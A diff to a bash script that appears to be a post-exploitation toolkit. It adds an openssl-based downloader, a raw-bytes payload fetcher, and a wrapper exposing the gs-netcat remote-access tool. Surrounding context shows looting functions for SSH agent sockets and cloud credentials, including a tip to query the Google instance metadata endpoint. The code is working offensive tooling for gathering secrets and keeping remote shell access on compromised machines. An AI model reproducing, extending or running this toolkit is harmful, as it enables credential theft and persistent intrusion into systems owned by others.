@@ -107,6 +107,14 @@ xssh() {
     stty "${ttyp}"
 }
 
+surl() {
+    local r="${1#*://}"
+    IFS=/ read -r host query <<<"${r}"
+    echo -en "GET /${query} HTTP/1.0\r\nHost: ${host%%:*}\r\n\r\n" \
+	| openssl s_client -ignore_unexpected_eof -verify_quiet -quiet -ign_eof -connect "${host%%:*}:443" \
+	| sed '1,/^\r\{0,1\}$/d'
+}
+
 burl() {
     local proto x host query
     IFS=/ read -r proto x host query <<<"$1"
@@ -731,6 +739,13 @@ _loot_yandex() {
     echo -e "${CW}TIP: ${CDC}curl -SsfL 'http://169.254.169.254/computeMetadata/v1/instance/?alt=text&recursive=true' -H 'Metadata-Flavor:Google'${CN}"
 }
 
+# make GS-NETCAT command available if logged in via GSNC.
+gsnc() {
+    [ -z "$GSNC" ] && return 255
+    _GS_ALLOWNOARG=1 "$GSNC" "$@"
+}
+command -v gs-netcat >/dev/null || gs-netcat() { gsnc "$@"; }
+
 lootlight() {
     local str
     ls -al /tmp/ssh-* &>/dev/null && {
@@ -997,18 +1012,21 @@ hs_init_dl() {
         dl() {
             local opts="timeout=10"
             local opts_init
-            local url
+            local url="${1:?}"
+            { [[ "${url:0:8}" == "https://" ]] || [[ "${url:0:7}" == "http://" ]]; } || url="https://${url}"
             [ -n "$UNSAFE" ] && {
                 opts_init="import ssl;ctx = ssl.create_default_context();ctx.check_hostname = False;ctx.verify_mode = ssl.CERT_NONE;"
                 opts+=", context=ctx"
             }
-            url="'${1:?}'"
-            "$HS_PY" -c "import urllib.request;${opts_init}print(urllib.request.urlopen($url, $opts).read().decode('utf-8'))"
+            "$HS_PY" -c "import urllib.request;import sys;${opts_init}sys.stdout.buffer.write(urllib.request.urlopen($url, $opts).read())"
         }
+    elif command openssl >/dev/null; then
+        dl() { surl "$@"; }
     else
         dl() { HS_ERR "Not found: curl, wget, python"; }
     fi
 }
+
 
 hs_init() {
     local a
